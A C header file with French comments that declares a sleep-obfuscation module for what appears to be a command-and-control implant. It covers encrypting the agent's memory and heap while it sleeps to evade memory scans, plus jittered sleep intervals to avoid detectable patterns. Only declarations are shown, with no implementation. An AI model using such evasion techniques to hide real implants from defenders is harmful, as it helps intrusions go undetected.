/*
 * sleep.h - Techniques de sleep obfuscation
 *
 * Pendant le sleep, l'agent est vulnérable aux scans mémoire.
 * Ces techniques chiffrent la mémoire pendant le sleep.
 */

#ifndef SLEEP_H
#define SLEEP_H

#include "../../include/common.h"

/*
 * Initialise le module de sleep obfuscation.
 */
int sleep_init(void);

/*
 * Sleep sécurisé avec obfuscation mémoire.
 * Chiffre la mémoire de l'agent pendant le sleep.
 *
 * Params:
 *   ms - Durée du sleep en millisecondes
 */
void obfuscated_sleep(DWORD ms);

/*
 * Sleep basique sans obfuscation.
 * Fallback si l'init a échoué.
 */
void basic_sleep(DWORD ms);

/*
 * Sleep avec jitter aléatoire pour éviter les patterns
 *
 * Params:
 *   baseMs - Durée de base en millisecondes
 *   jitterPercent - Pourcentage de variation (0-100)
 */
void sleep_with_jitter(DWORD baseMs, DWORD jitterPercent);

/*
 * Active/désactive le chiffrement heap pendant le sleep
 */
void sleep_set_heap_encryption(bool enabled);
bool sleep_is_heap_encryption_enabled(void);

/*
 * Cleanup du module.
 */
void sleep_cleanup(void);

#endif /* SLEEP_H */
